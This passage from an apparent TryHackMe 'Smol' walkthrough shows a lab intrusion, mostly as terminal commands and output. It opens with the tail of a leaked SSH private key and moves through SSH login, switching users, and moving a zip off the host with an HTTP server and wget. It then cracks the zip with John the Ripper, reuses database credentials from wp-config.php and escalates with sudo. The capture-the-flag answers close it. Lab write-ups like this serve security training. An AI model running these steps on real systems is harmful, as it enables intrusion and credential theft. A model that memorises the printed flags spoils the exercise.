        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
        -----END OPENSSH PRIVATE KEY-----
        
        ```
        
    - in new terminal save the key
        
        ```jsx
        ┌──(neo㉿lab)-[~/pro/tryhackme/smol]
        └─$ chmod 600 id_rsa
                                                                                                                                     
        ┌──(neo㉿lab)-[~/pro/tryhackme/smol]
        └─$ ssh -i id_rsa think@smol.thm              
        The authenticity of host 'smol.thm (10.10.149.172)' can't be established.
        ED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.
        This key is not known by any other names.
        Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
        Warning: Permanently added 'smol.thm' (ED25519) to the list of known hosts.
        Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)
        
         * Documentation:  https://help.ubuntu.com
         * Management:     https://landscape.canonical.com
         * Support:        https://ubuntu.com/advantage
        
          System information as of Sat 08 Mar 2025 04:20:47 AM UTC
        
          System load:  0.0               Processes:             141
          Usage of /:   57.0% of 9.75GB   Users logged in:       0
          Memory usage: 18%               IPv4 address for ens5: 10.10.149.172
          Swap usage:   0%
        
        Expanded Security Maintenance for Applications is not enabled.
        
        162 updates can be applied immediately.
        125 of these updates are standard security updates.
        To see these additional updates run: apt list --upgradable
        
        Enable ESM Apps to receive additional future security updates.
        See https://ubuntu.com/esm or run: sudo pro status
        
        The list of available updates is more than a week old.
        To check for new updates run: sudo apt update
        
        think@smol:~$ ls
        
        ```
        
    - moving to gege user
        
        ```jsx
        think@smol:~$ su gege
        gege@smol:/home/think$ ls
        gege@smol:/home/think$ cd home
        bash: cd: home: No such file or directory
        gege@smol:/home/think$ cd /home
        gege@smol:/home$ ls
        diego  gege  think  xavi
        gege@smol:/home$ cd gego
        bash: cd: gego: No such file or directory
        gege@smol:/home$ cd /gege
        bash: cd: /gege: No such file or directory
        gege@smol:/home$ cd \gege
        gege@smol:~$ ls
        wordpress.old.zip
        gege@smol:~$ python3 -m http.server 9000
        Serving HTTP on 0.0.0.0 port 9000 ([http://0.0.0.0:9000/](http://0.0.0.0:9000/)) ...
        10.2.26.145 - - [08/Mar/2025 04:29:31] "GET /wordpress.old.zip HTTP/1.1" 200 -
        ```
        
    - find a wordpress.zip file >> transfar file
        
        ```jsx
        gege@smol:~$ python3 -m http.server 9000
        Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
        10.2.26.145 - - [08/Mar/2025 04:29:31] "GET /wordpress.old.zip HTTP/1.1" 200 -
         
        ```
        
        ```jsx
        $ wget http://10.10.149.172:9000/wordpress.old.zip
        --2025-03-07 23:29:31--  http://10.10.149.172:9000/wordpress.old.zip
        Connecting to 10.10.149.172:9000... connected.
        HTTP request sent, awaiting response... 200 OK
        Length: 32266546 (31M) [application/zip]
        Saving to: ‘wordpress.old.zip’
        
        wordpress.old.zip               100%[====================================================>]  30.77M  1.08MB/s    in 41s     
        
        2025-03-07 23:30:12 (776 KB/s) - ‘wordpress.old.zip’ saved [32266546/32266546]
        
                                                                                                                                     
        ┌──(neo㉿lab)-[~/pro/tryhackme/smol]
        └─$ ls
        hash.txt  id_rsa  wordpress.old.zip
                                                                                                                                     
        ┌──(neo㉿lab)-[~/pro/tryhackme/smol]
        
        ```
        
    - creaking the .zip file
        
        ```jsx
        ─(neo㉿lab)-[~/pro/tryhackme/smol]
        └─$ john hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt
        Using default input encoding: UTF-8
        Loaded 1 password hash (PKZIP [32/64])
        Will run 4 OpenMP threads
        Press 'q' or Ctrl-C to abort, almost any other key for status
        hero_gege@hotmail.com (wordpress.old.zip)     
        1g 0:00:00:01 DONE (2025-03-07 23:32) 0.8403g/s 6409Kp/s 6409Kc/s 6409KC/s hesse..hepiboth
        Use the "--show" option to display all of the cracked passwords reliably
        Session completed. 
                                                  
        ```
        
        passwd = hero_gege@hotmail.com 
        
    - open the wp-config.php and you will find user name and pass
        
        ```jsx
        
        /** Database username */
        define( 'DB_USER', 'xavi' );
        
        /** Database password */
        define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
        
        /** Database hostname */
        ```
        
    - login with user xavi
        
        ```jsx
        gege@smol:~$ su xavi
        Password: 
        xavi@smol:/home/gege$ ls
        wordpress.old.zip
        xavi@smol:/home/gege$ 
        
        ```
        
    - going to root and finding the flage
        
        Password:
        xavi@smol:/home/gege$ ls
        wordpress.old.zip
        xavi@smol:/home/gege$ sudo -i
        [sudo] password for xavi:
        Sorry, try again.
        [sudo] password for xavi:
        root@smol:~$ ls
        total 48K
        drwx------  7 root root 4.0K Jan 28 13:46 .
        drwxr-xr-x 18 root root 4.0K Mar 29  2024 ..
        lrwxrwxrwx  1 root root    9 Jun  2  2023 .bash_history -> /dev/null
        -rw-r--r--  1 root root 3.2K Jun 21  2023 .bashrc
        drwx------  2 root root 4.0K Jun  2  2023 .cache
        -rw-------  1 root root   35 Mar 29  2024 .lesshst
        drwxr-xr-x  3 root root 4.0K Jun 21  2023 .local
        lrwxrwxrwx  1 root root    9 Aug 18  2023 .mysql_history -> /dev/null
        drwxr-xr-x  4 root root 4.0K Aug 16  2023 .phpbrew
        -rw-r--r--  1 root root  161 Dec  5  2019 .profile
        -rw-r-----  1 root root   33 Aug 16  2023 root.txt
        -rw-r--r--  1 root root   75 Aug 17  2023 .selected_editor
        drwx------  3 root root 4.0K Jun 21  2023 snap
        drwx------  2 root root 4.0K Jun  2  2023 .ssh
        -rw-rw-rw-  1 root root    0 Jan 28 13:46 .viminfo
        root@smol:~$ cat root.txt
        bf89ea3ea01992353aef1f576214d4e4
        root@smol:~$
        
- Flags
    
    **user {**   THM45edaec653ff9ee06236b7ce72b86963   workitout**}**
    
    **root {     THM**bf89ea3ea01992353aef1f576214d4e4    **workitout}**
    
    
<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>